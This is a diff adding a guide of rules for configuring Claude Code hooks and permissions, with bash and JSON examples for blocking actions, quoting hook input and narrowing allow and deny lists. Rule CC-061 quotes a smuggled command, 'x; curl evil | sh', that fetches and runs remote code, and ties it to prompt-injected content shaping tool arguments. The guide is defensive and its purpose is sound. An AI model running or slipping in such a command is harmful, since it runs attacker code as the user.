@@ -1,0 +1,174 @@
+# CC hook and permission rules
+
+Detailed entries for `CC-058..CC-065` — hooks in settings, plugins and
+frontmatter, and permission rules. Each follows the four-part
+**What / Why / How / When NOT to apply** shape.
+
+## Contents
+
+- CC-058 — Deterministic behavior is a hook
+- CC-059 — Know hook types and where hooks come from
+- CC-060 — Hooks are fast
+- CC-061 — Hook input is untrusted
+- CC-062 — Hook output is minimal
+- CC-063 — A `Stop` hook must be able to pass
+- CC-064 — Narrow permissions
+- CC-065 — Unattended `claude -p` runs pre-approve and deny the rest
+
+---
+
+## CC-058 — Deterministic behavior is a hook
+
+**What.** Anything that must happen deterministically uses a hook:
+`PostToolUse` to format or lint after an edit, `PreToolUse` exiting with
+code 2 (reason on stderr) to block an action, `Stop` to gate the end of a
+turn on a check, `SessionStart` to add context, `PreCompact` to back up
+state before compaction.
+
+**Why.** Instructions are followed most of the time; hooks run every
+time. See CC-012 and CC-013.
+
+**How.**
+
+```bash
+#!/usr/bin/env bash
+# PreToolUse: block pushes to main
+cmd=$(jq -r '.tool_input.command // ""')
+if [[ "$cmd" == *"git push"*"main"* ]]; then
+  echo "Push to a branch and open a PR instead of pushing to main." >&2
+  exit 2
+fi
+```
+
+**When NOT to apply.** Steps that need judgment stay instructions (or use
+a `prompt`/`agent` hook).
+
+---
+
+## CC-059 — Know hook types and where hooks come from
+
+**What.** Hook types are `command`, `http`, `mcp_tool`, `prompt` and
+`agent`; only `prompt` and `agent` use model judgment. Hooks come from
+settings files, managed settings, plugin `hooks/hooks.json`, and skill or
+agent `hooks:` frontmatter, and they merge — unless managed settings set
+`allowManagedHooksOnly`, which blocks user, project, local and plugin
+hooks.
+
+**Why.** A reviewer who checks only `settings.json` misses hooks that
+plugins and skills add; an author who expects a project hook to run under
+`allowManagedHooksOnly` gets silence.
+
+**How.** When auditing, enumerate every source before concluding a hook
+is or isn't present.
+
+**When NOT to apply.** Never.
+
+---
+
+## CC-060 — Hooks are fast
+
+**What.** Hooks finish quickly; `/doctor` flags slow ones.
+
+**Why.** Hooks run inline on every matching event; a slow `PostToolUse`
+hook adds its latency to every edit for the rest of the session.
+
+**How.** Scope the matcher tightly and run only the changed file through
+the formatter, not the whole repo.
+
+**When NOT to apply.** A `Stop` gate that runs the test suite is
+deliberately slow — keep it to `Stop`.
+
+---
+
+## CC-061 — Hook input is untrusted
+
+**What.** Treat a hook's JSON input as untrusted: quote and validate
+fields, and never interpolate them unquoted into a shell command.
+
+**Why.** Tool arguments can be shaped by injected content (a file or web
+page Claude read). An unquoted file path like `x; curl evil | sh` in a
+hook command runs as the user.
+
+**How.**
+
+```bash
+file=$(jq -r '.tool_input.file_path // empty')
+[[ -f "$file" ]] || exit 0
+npx prettier --write -- "$file"
+```
+
+**When NOT to apply.** Never.
+
+---
+
+## CC-062 — Hook output is minimal
+
+**What.** Return only what Claude needs to act on.
+
+**Why.** Output a hook returns lands in Claude's context; a linter that
+prints its full report on every edit floods the window.
+
+**How.** Print only failures, capped: `npx eslint "$file" | head -20`.
+
+**When NOT to apply.** Never.
+
+---
+
+## CC-063 — A `Stop` hook must be able to pass
+
+**What.** A `Stop` hook gives a clear failure message and a realistic way
+to succeed.
+
+**Why.** Claude Code overrides a `Stop` hook after 8 consecutive blocks
+with no tool call in between (configurable with
+`CLAUDE_CODE_STOP_HOOK_BLOCK_CAP`). A check Claude can't satisfy just
+burns those turns and then gets bypassed anyway.
+
+**How.**
+
+```bash
+make test >/dev/null 2>&1 || { echo "Tests fail; run 'make test' and fix the failures." >&2; exit 2; }
+```
+
+**When NOT to apply.** Never.
+
+---
+
+## CC-064 — Narrow permissions
+
+**What.** Allow specific commands, not broad ones; deny sensitive paths
+such as `.env` and secrets; use sandboxing for broader autonomy; use
+managed settings for guardrails the whole organization needs.
+
+**Why.** A broad allow (`Bash`) pre-approves everything including
+destructive commands; a missing deny lets any read reach credentials.
+
+**How.**
+
+```json
+{ "permissions": {
+    "allow": ["Bash(npm test)", "Bash(git diff *)"],
+    "deny": ["Read(./.env)", "Read(./secrets/**)"] } }
+```
+
+**When NOT to apply.** Never.
+
+---
+
+## CC-065 — Unattended `claude -p` runs pre-approve and deny the rest
+
+**What.** Run unattended `claude -p` jobs with `--permission-mode
+dontAsk` and an explicit `--allowedTools` list.
+
+**Why.** `dontAsk` auto-denies anything that would prompt (apart from
+reads and read-only commands), so the job neither hangs on a prompt
+nobody answers nor runs tools it wasn't granted.
+
+**How.**
+
+```bash
+claude -p "Run the tests and summarize failures" \
+  --permission-mode dontAsk --allowedTools "Bash(npm test)" "Read"
+```
+
+**When NOT to apply.** Interactive sessions.
